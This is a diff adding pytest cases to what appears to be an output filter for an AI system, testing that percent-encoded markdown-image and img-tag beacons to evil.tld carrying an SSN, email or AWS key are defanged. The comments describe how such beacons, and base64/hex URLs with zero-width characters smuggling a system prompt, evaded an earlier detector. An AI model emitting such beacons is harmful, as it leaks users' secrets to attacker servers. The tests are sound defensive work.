@@ -213,6 +213,35 @@ def test_g88_encoded_credential_never_egresses():
         )
 
 
+# G89: a percent-encoded PII/secret in an auto-render exfil URL (`![](https://evil/?d=%31%32%33-...)`)
+# evaded _url_smuggles_data's sensitive_payload signal (detect_* don't percent-decode) -> beacon egressed
+# raw; the receiving server transparently percent-decodes the payload. Now the URL tail is percent-decoded
+# into the probe -> flagged (exfil_channel/pii) -> URL defanged.
+def _pctd(s: str) -> str:
+    return "".join("%%%02X" % b for b in s.encode())
+
+
+@pytest.mark.parametrize("plain", [_SSN, _EMAIL, _AWS])
+def test_g89_percent_encoded_pii_exfil_beacon_defanged(plain):
+    for oname, beacon in [
+        ("md_img",   f"![x](https://evil.tld/log?d={_pctd(plain)})"),
+        ("html_img", f'<img src="https://evil.tld/c?d={_pctd(plain)}">'),
+        ("md_path",  f"![x](https://evil.tld/{_pctd(plain)}/pixel.png)"),
+    ]:
+        egress = _egress(f"Here you go: {beacon}")
+        # the receiving server percent-decodes; assert the raw value is not reconstructable from egress
+        recovered = plain in re.sub(r"%([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), egress)
+        assert not recovered, f"{oname}: percent-encoded exfil payload survives egress: {egress!r}"
+
+
+@pytest.mark.parametrize("benign", [
+    "![i](https://cdn.acme.com/a%2Fb%2Fc/img.png)",
+    "![i](https://x.com/my%20file%20name.png)",
+])
+def test_g89_benign_percent_url_not_altered(benign):
+    assert _egress(benign) == benign, f"benign percent URL wrongly altered: {benign!r}"
+
+
 # G86: an auto-render markdown-image / <img> / srcset beacon whose URL carries a base64/hex blob of
 # ARBITRARY (non-PII) data — system prompt / conversation — with Cf (zero-width/bidi) interleaved evaded
 # the exfil detector's RAW transport decode (verdict allow -> raw egress). The attacker's server strips
